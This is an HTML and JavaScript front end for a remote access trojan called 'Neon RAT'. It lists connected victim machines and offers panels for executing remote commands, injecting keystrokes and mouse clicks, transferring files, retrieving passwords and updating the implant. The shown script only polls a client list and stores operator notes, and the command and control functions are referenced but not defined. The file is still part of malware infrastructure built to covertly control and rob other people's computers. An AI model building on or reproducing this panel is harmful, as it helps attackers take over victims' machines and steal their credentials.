<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon RAT Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        /* Previous CSS remains the same */
        .notes-panel {
            background: rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
        }
        .notes-panel h3 {
            color: var(--secondary);
            margin-top: 0;
        }
        #notes-input {
            width: 100%;
            min-height: 100px;
            padding: 10px;
            margin-bottom: 10px;
            border: none;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
            color: var(--light);
            resize: vertical;
        }
        #save-notes {
            background: var(--primary);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Sidebar (unchanged) -->
        <div class="sidebar">
            <h2>Connected Clients</h2>
            <div id="client-list"></div>
        </div>

        <!-- Main Content -->
        <div class="main">
            <h1>Neon RAT Dashboard</h1>
            <div class="tab-buttons">
                <button class="tab-btn active" onclick="openTab('control')">Control</button>
                <button class="tab-btn" onclick="openTab('files')">Files</button>
                <button class="tab-btn" onclick="openTab('passwords')">Passwords</button>
                <button class="tab-btn" onclick="openTab('update')">Update</button>
            </div>

            <!-- Control Tab -->
            <div id="control" class="tab-content active">
                <div class="panel">
                    <h3>Remote Commands</h3>
                    <input type="text" id="command-input" placeholder="Enter command...">
                    <button onclick="sendCommand()">Execute</button>
                    <pre id="command-output">No output yet.</pre>
                </div>
                <div class="panel">
                    <h3>Remote Control</h3>
                    <input type="text" id="key-input" placeholder="Key to press (e.g., 'Ctrl+C')">
                    <button onclick="sendKey()">Send Key</button>
                    <input type="text" id="mouse-pos" placeholder="X,Y coordinates">
                    <button onclick="moveMouse()">Move Mouse</button>
                    <button onclick="clickMouse('left')">Left Click</button>
                    <button onclick="clickMouse('right')">Right Click</button>
                </div>

                <!-- New Notes Section -->
                <div class="notes-panel">
                    <h3>Notes</h3>
                    <textarea id="notes-input" placeholder="Write your notes here..."></textarea>
                    <button id="save-notes" onclick="saveNotes()">Save Notes</button>
                </div>
            </div>

            <!-- Other Tabs (unchanged) -->
            <div id="files" class="tab-content">
                <!-- File transfer UI -->
            </div>
            <div id="passwords" class="tab-content">
                <!-- Password retrieval UI -->
            </div>
            <div id="update" class="tab-content">
                <!-- Client update UI -->
            </div>
        </div>
    </div>

    <script>
        // Tab management (unchanged)
        function openTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.style.display = 'none';
            });
            document.querySelectorAll('.tab-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).style.display = 'block';
            event.currentTarget.classList.add('active');
        }

        // Client management (unchanged)
        let selectedClient = null;
        function updateClients() {
            fetch('/api/clients')
                .then(res => res.json())
                .then(data => {
                    const clientList = document.getElementById('client-list');
                    clientList.innerHTML = '';
                    data.clients.forEach(client => {
                        const tab = document.createElement('div');
                        tab.className = 'client-tab';
                        if (client === selectedClient) tab.classList.add('active');
                        tab.innerHTML = `
                            <div class="client-icon"></div>
                            ${client}
                            <span class="status">Online</span>
                        `;
                        tab.onclick = () => {
                            selectedClient = client;
                            document.querySelectorAll('.client-tab').forEach(t => {
                                t.classList.remove('active');
                            });
                            tab.classList.add('active');
                        };
                        clientList.appendChild(tab);
                    });
                });
            setTimeout(updateClients, 2000);
        }

        // Notes functionality
        function loadNotes() {
            const savedNotes = localStorage.getItem('rat_notes');
            if (savedNotes) {
                document.getElementById('notes-input').value = savedNotes;
            }
        }

        function saveNotes() {
            const notes = document.getElementById('notes-input').value;
            localStorage.setItem('rat_notes', notes);
            alert('Notes saved!');
        }

        // Initialize
        updateClients();
        loadNotes(); // Load saved notes on page load
    </script>
</body>
</html>
